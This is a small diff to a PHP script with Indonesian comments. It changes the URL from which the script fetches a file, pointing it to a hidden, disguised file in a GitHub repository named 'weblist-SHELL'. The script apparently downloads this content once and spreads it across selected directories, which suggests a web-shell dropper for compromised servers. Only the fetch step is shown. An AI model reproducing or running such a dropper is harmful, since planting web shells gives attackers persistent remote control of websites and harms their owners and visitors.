@@ -43,7 +43,7 @@ if (empty($selectedDirs)) {
 }
 
 // URL sumber file yang akan diunduh
-$sourceFileUrl = 'https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/forbiden404-v2-html.php';
+$sourceFileUrl = 'https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/.00Datawep.inc2.js';
 
 // Mengunduh konten dari URL sumber sekali saja untuk efisiensi
 $fileContent = file_get_contents($sourceFileUrl);
